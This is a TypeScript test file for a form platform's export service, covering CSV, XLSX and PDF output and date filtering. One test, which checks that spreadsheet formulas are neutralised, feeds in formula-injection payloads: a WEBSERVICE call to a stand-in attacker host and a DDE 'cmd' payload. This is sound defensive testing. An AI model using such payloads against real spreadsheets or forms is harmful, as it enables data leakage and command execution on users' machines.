import { FieldKindEnum, FormField } from '@myform/shared-types-enums'
import assert from 'assert'
import { Workbook } from 'exceljs'
import { PassThrough } from 'stream'

import { ExportFileService } from '../src/service/export-file.service'
import {
  effectiveSubmittedAt,
  isWithinRange,
  resolveExportDateRange
} from '../src/utils/export-range'

function parseCsvRow(value: string): string[] {
  const cells: string[] = []
  let cell = ''
  let quoted = false

  for (let index = 0; index < value.length; index += 1) {
    const character = value[index]

    if (character === '"') {
      if (quoted && value[index + 1] === '"') {
        cell += '"'
        index += 1
      } else {
        quoted = !quoted
      }
    } else if (character === ',' && !quoted) {
      cells.push(cell)
      cell = ''
    } else {
      cell += character
    }
  }

  cells.push(cell)
  return cells
}

async function testExportsRepeatedQuestionTitlesByFieldId() {
  const formFields: FormField[] = Array.from({ length: 9 }, (_, index) => [
    {
      id: `appeal-${index + 1}`,
      kind: FieldKindEnum.OPINION_SCALE,
      title: 'Appeal'
    },
    {
      id: `likelihood-${index + 1}`,
      kind: FieldKindEnum.OPINION_SCALE,
      title: 'Likelihood'
    }
  ]).flat()

  const expectedAnswers = formFields.map((field, index) => `${index + 1}`)
  const csv = await new ExportFileService().csv(
    formFields,
    [],
    [
      {
        id: 'submission-1',
        answers: formFields.map((field, index) => ({
          id: field.id,
          kind: field.kind,
          title: field.title,
          value: expectedAnswers[index]
        })),
        hiddenFields: []
      } as any
    ]
  )

  const [header, row] = csv.split(/\r?\n/)

  assert.deepStrictEqual(parseCsvRow(header), [
    '#',
    ...formFields.map(field => field.title),
    'Start Date (UTC)',
    'Submit Date (UTC)'
  ])
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', ...expectedAnswers, '', ''])
}

async function testExportsMultipleChoiceOtherText() {
  const formField: FormField = {
    id: 'favorite-colors',
    kind: FieldKindEnum.MULTIPLE_CHOICE,
    title: 'Favorite colors',
    properties: {
      allowMultiple: true,
      allowOther: true,
      choices: [
        { id: 'red', label: 'Red' },
        { id: 'blue', label: 'Blue' }
      ]
    }
  }
  const csv = await new ExportFileService().csv(
    [formField],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: formField.id,
            kind: formField.kind,
            title: formField.title,
            properties: formField.properties,
            value: {
              value: ['red'],
              other: 'Chartreuse'
            }
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', 'Red, Chartreuse', '', ''])
}

async function testExportsBlankOtherAsOther() {
  const formField: FormField = {
    id: 'favorite-colors',
    kind: FieldKindEnum.MULTIPLE_CHOICE,
    title: 'Favorite colors',
    properties: {
      allowMultiple: true,
      allowOther: true,
      allowBlankOther: true,
      choices: [
        { id: 'red', label: 'Red' },
        { id: 'blue', label: 'Blue' }
      ]
    }
  }
  const csv = await new ExportFileService().csv(
    [formField],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: formField.id,
            kind: formField.kind,
            title: formField.title,
            properties: formField.properties,
            value: { value: ['red'], other: '' }
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', 'Red, Other', '', ''])
}

async function testExportsLegacyFileUploadUrls() {
  const csv = await new ExportFileService().csv(
    [
      {
        id: 'attachment',
        kind: FieldKindEnum.FILE_UPLOAD,
        title: 'Attachment'
      }
    ],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: 'attachment',
            kind: FieldKindEnum.FILE_UPLOAD,
            title: 'Attachment',
            value: {
              filename: 'report.pdf',
              cdnUrlPrefix: 'https://cdn.example.com/uploads/',
              cdnKey: '/file-id'
            }
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)

  assert.deepStrictEqual(parseCsvRow(row), [
    'submission-1',
    'https://cdn.example.com/uploads/file-id',
    '',
    ''
  ])
}

async function testNeutralizesSpreadsheetFormulas() {
  const csv = await new ExportFileService().csv(
    [
      {
        id: 'formula-answer',
        kind: FieldKindEnum.SHORT_TEXT,
        title: '=1+1'
      },
      {
        id: 'whitespace-formula-answer',
        kind: FieldKindEnum.SHORT_TEXT,
        title: 'Safe title'
      },
      {
        id: 'control-formula-answer',
        kind: FieldKindEnum.SHORT_TEXT,
        title: 'Control-prefix formula'
      }
    ],
    [
      {
        id: 'formula-hidden',
        name: '  @SUM(A1)'
      }
    ],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: 'formula-answer',
            kind: FieldKindEnum.SHORT_TEXT,
            title: 'Formula answer',
            value: '=WEBSERVICE("https://attacker.test")'
          },
          {
            id: 'whitespace-formula-answer',
            kind: FieldKindEnum.SHORT_TEXT,
            title: 'Whitespace formula answer',
            value: '  -1+1'
          },
          {
            id: 'control-formula-answer',
            kind: FieldKindEnum.SHORT_TEXT,
            title: 'Control formula answer',
            value: '\u0000\u0007=1+1'
          }
        ],
        hiddenFields: [
          {
            id: 'formula-hidden',
            name: 'Formula hidden',
            value: "+cmd|' /C calc'!A0"
          }
        ]
      } as any
    ]
  )

  const [header, row] = csv.split(/\r?\n/)

  assert.deepStrictEqual(parseCsvRow(header), [
    '#',
    `'=1+1`,
    'Safe title',
    'Control-prefix formula',
    `'  @SUM(A1)`,
    'Start Date (UTC)',
    'Submit Date (UTC)'
  ])
  assert.deepStrictEqual(parseCsvRow(row), [
    'submission-1',
    `'=WEBSERVICE("https://attacker.test")`,
    `'  -1+1`,
    `'\u0000\u0007=1+1`,
    `'+cmd|' /C calc'!A0`,
    '',
    ''
  ])
}

async function testMalformedLegacyInputTableDoesNotBreakExport() {
  const csv = await new ExportFileService().csv(
    [
      {
        id: 'table',
        kind: FieldKindEnum.INPUT_TABLE,
        title: 'Table',
        properties: { tableColumns: [{ id: 'column_1', label: 'Column' }] }
      }
    ],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: 'table',
            kind: FieldKindEnum.INPUT_TABLE,
            title: 'Table',
            properties: { tableColumns: [{ id: 'column_1', label: 'Column' }] },
            value: 'malformed historical value'
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', '', '', ''])
}

// Collects everything a streaming export writes into a pipe until it ends
function collectStreamOutput(output: PassThrough): Promise<Buffer> {
  const chunks: Buffer[] = []

  return new Promise((resolve, reject) => {
    output.on('data', (chunk: Buffer) => chunks.push(chunk))
    output.on('end', () => resolve(Buffer.concat(chunks)))
    output.on('error', reject)
  })
}

// Wraps submissions into the batch async iterable the streaming exporters consume
function batchedSubmissions(batches: any[][]): AsyncGenerator<any[]> {
  return (async function* () {
    for (const batch of batches) {
      yield batch
    }
  })()
}

function testResolveExportDateRange() {
  // No bounds → no filter
  assert.deepStrictEqual(resolveExportDateRange(), {})
  assert.deepStrictEqual(resolveExportDateRange(undefined, undefined), {})

  // Date-only bounds select whole UTC days: `from` at 00:00:00.000Z and `to`
  // at the day's last millisecond, so both day edges stay inside the window
  const june15 = Date.parse('2024-06-15T00:00:00.000Z')

  assert.deepStrictEqual(resolveExportDateRange('2024-06-15', undefined), {
    from: june15 / 1000
  })
  assert.deepStrictEqual(resolveExportDateRange(undefined, '2024-06-15'), {
    to: (june15 + 86_400_000 - 1) / 1000
  })
  assert.deepStrictEqual(resolveExportDateRange('2024-06-01', '2024-06-15'), {
    from: Date.parse('2024-06-01T00:00:00.000Z') / 1000,
    to: (june15 + 86_400_000 - 1) / 1000
  })

  // Full timestamps are used as-is, down to the millisecond
  assert.deepStrictEqual(
    resolveExportDateRange('2024-06-15T08:30:00.000Z', '2024-06-20T23:59:59.999Z'),
    {
      from: Date.parse('2024-06-15T08:30:00.000Z') / 1000,
      to: Date.parse('2024-06-20T23:59:59.999Z') / 1000
    }
  )

  // Values that do not parse to a real date are ignored, like omitted bounds
  assert.deepStrictEqual(resolveExportDateRange('not-a-date', 'nope'), {})
}

function testEffectiveSubmittedAtPrefersEndAt() {
  // endAt (unix seconds) wins whenever it is present, $ifNull semantics
  assert.strictEqual(
    effectiveSubmittedAt({ endAt: 1718409600, createdAt: new Date(0) }),
    1718409600
  )

  // A missing endAt falls back to createdAt (Date, ISO string or ms number)
  assert.strictEqual(
    effectiveSubmittedAt({ createdAt: new Date('2024-06-15T12:00:00.000Z') }),
    Date.parse('2024-06-15T12:00:00.000Z') / 1000
  )
  assert.strictEqual(
    effectiveSubmittedAt({ createdAt: '2024-06-15T12:00:00.000Z' }),
    Date.parse('2024-06-15T12:00:00.000Z') / 1000
  )
  assert.strictEqual(effectiveSubmittedAt({ createdAt: 1718462400000 }), 1718462400)

  // No usable timestamp at all
  assert.strictEqual(effectiveSubmittedAt({}), undefined)
}

function testIsWithinRangeInclusiveBounds() {
  const from = 1_718_409_600
  const to = 1_718_495_999

  // Unbounded windows match everything, even without a timestamp
  assert.strictEqual(isWithinRange({}, undefined, undefined), true)

  // Both bounds are inclusive
  assert.strictEqual(isWithinRange({ endAt: from }, from, to), true)
  assert.strictEqual(isWithinRange({ endAt: to }, from, to), true)
  assert.strictEqual(isWithinRange({ endAt: from - 1 }, from, to), false)
  assert.strictEqual(isWithinRange({ endAt: to + 1 }, from, to), false)

  // Half-open windows
  assert.strictEqual(isWithinRange({ endAt: 1 }, from, undefined), false)
  assert.strictEqual(isWithinRange({ endAt: from }, from, undefined), true)
  assert.strictEqual(isWithinRange({ endAt: to }, undefined, to), true)
  assert.strictEqual(isWithinRange({ endAt: to + 1 }, undefined, to), false)

  // Submissions without a usable timestamp never match a bounded window
  assert.strictEqual(isWithinRange({}, from, to), false)
  assert.strictEqual(isWithinRange({ createdAt: 'not-a-date' }, from, to), false)

  // endAt is preferred over createdAt
  assert.strictEqual(isWithinRange({ endAt: to, createdAt: 0 }, from, to), true)
  assert.strictEqual(isWithinRange({ endAt: 0, createdAt: to }, from, to), false)
}

async function testCsvChunkReassemblesFullCsv() {
  const formFields: FormField[] = [
    { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name' },
    { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age' }
  ]

  const submissions = [
    {
      id: 'submission-1',
      answers: [
        { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name', value: 'Alice' },
        { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age', value: '30' }
      ],
      hiddenFields: []
    },
    {
      id: 'submission-2',
      answers: [
        { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name', value: 'Bob' },
        { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age', value: '41' }
      ],
      hiddenFields: []
    }
  ] as any[]

  const service = new ExportFileService()
  const whole = await service.csv(formFields, [], submissions)
  const firstChunk = await service.csvChunk(formFields, [], submissions.slice(0, 1))
  const restChunk = await service.csvChunk(formFields, [], submissions.slice(1), false, false)

  // The first chunk carries the header row, every following one only data
  assert.ok(firstChunk.split(/\r?\n/)[0].includes('#'))
  assert.ok(!restChunk.split(/\r?\n/)[0].includes('#'))

  // Concatenating the chunks with '\n' reproduces exactly what csv() returns
  // for the whole set — what the controller streams to the response
  assert.strictEqual(whole, `${firstChunk}\n${restChunk}`)
}

async function testXlsxStreamProducesWorkbook() {
  const formFields: FormField[] = [
    { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name' },
    { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age' }
  ]

  const submissions = [
    {
      id: 'submission-1',
      answers: [
        { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name', value: 'Alice' },
        { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age', value: '30' }
      ],
      hiddenFields: []
    },
    {
      id: 'submission-2',
      answers: [
        { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name', value: 'Bob' },
        { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age', value: '41' }
      ],
      hiddenFields: []
    }
  ] as any[]

  const output = new PassThrough()
  const collected = collectStreamOutput(output)

  await new ExportFileService().xlsxStream(
    formFields,
    [],
    batchedSubmissions([submissions]),
    false,
    output
  )
  const buffer = await collected

  // A real XLSX file is a ZIP archive...
  assert.strictEqual(buffer.subarray(0, 4).toString('latin1'), 'PK\u0003\u0004')

  // ...and exceljs can read it back: one header row plus one row per
  // submission, with the same columns as the CSV export
  const workbook = new Workbook()
  await workbook.xlsx.load(buffer)

  const sheet = workbook.worksheets[0]
  assert.strictEqual(sheet.name, 'Submissions')
  assert.strictEqual(sheet.rowCount, submissions.length + 1)
  assert.deepStrictEqual((sheet.getRow(1).values as any[]).slice(1), [
    '#',
    'Name',
    'Age',
    'Start Date (UTC)',
    'Submit Date (UTC)'
  ])
  assert.strictEqual(sheet.getRow(2).getCell(1).value, 'submission-1')
  assert.strictEqual(sheet.getRow(2).getCell(2).value, 'Alice')
  assert.strictEqual(sheet.getRow(3).getCell(1).value, 'submission-2')
  assert.strictEqual(sheet.getRow(3).getCell(2).value, 'Bob')
}

async function testPdfStreamProducesDocument() {
  const formFields: FormField[] = [
    { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name' },
    { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age' }
  ]

  const submissions = [
    {
      id: 'submission-1',
      answers: [
        { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name', value: 'Alice' },
        { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age', value: '30' }
      ],
      hiddenFields: []
    },
    {
      id: 'submission-2',
      answers: [
        { id: 'name', kind: FieldKindEnum.SHORT_TEXT, title: 'Name', value: 'Bob' },
        { id: 'age', kind: FieldKindEnum.NUMBER, title: 'Age', value: '41' }
      ],
      hiddenFields: []
    }
  ] as any[]

  const output = new PassThrough()
  const collected = collectStreamOutput(output)

  await new ExportFileService().pdfStream(
    'MyForm export test',
    formFields,
    [],
    batchedSubmissions([submissions]),
    false,
    output
  )
  const buffer = await collected
  const content = buffer.toString('latin1')

  // A real PDF document, one page per submission
  assert.strictEqual(buffer.subarray(0, 5).toString('latin1'), '%PDF-')
  assert.ok(content.includes('%%EOF'))
  assert.strictEqual((content.match(/\/Type \/Page(?!s)/g) || []).length, submissions.length)
}

async function run() {
  await testExportsRepeatedQuestionTitlesByFieldId()
  await testExportsMultipleChoiceOtherText()
  await testExportsBlankOtherAsOther()
  await testExportsLegacyFileUploadUrls()
  await testNeutralizesSpreadsheetFormulas()
  await testMalformedLegacyInputTableDoesNotBreakExport()
  testResolveExportDateRange()
  testEffectiveSubmittedAtPrefersEndAt()
  testIsWithinRangeInclusiveBounds()
  await testCsvChunkReassemblesFullCsv()
  await testXlsxStreamProducesWorkbook()
  await testPdfStreamProducesDocument()
}

if (require.main === module) {
  run().catch(error => {
    // eslint-disable-next-line no-console
    console.error(error)
    process.exitCode = 1
  })
}
